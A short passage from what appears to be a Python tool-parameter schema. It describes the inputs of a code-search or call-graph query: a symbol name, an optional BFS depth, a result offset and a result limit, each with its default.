            "symbol": "qualified_name (preferred) or bare name",
            "depth": "(optional) BFS depth, default 3",
            "offset": "(optional) skip first N results, default 0",
            "limit": "(optional) max results to return, default 1000",
        },
    },
}
